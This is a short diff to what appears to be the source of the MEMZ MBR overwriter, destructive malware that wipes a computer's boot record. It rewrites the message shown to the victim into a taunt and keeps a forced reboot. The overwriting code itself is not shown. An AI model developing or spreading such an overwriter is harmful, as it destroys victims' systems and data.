@@ -27,7 +27,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 			break;
 	}
 	Sleep(1000);
-	SpecialMsgBoxB(L"The MBR has been overwritten. Reboot...", L"MEMZ MBR Overwriter", MB_OK);
+	SpecialMsgBoxB(L"You just got overwritten, kid. please reboot for the changes", L"MEMZ MBR Overwriter", MB_OK);
 	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, 0);
 }
 
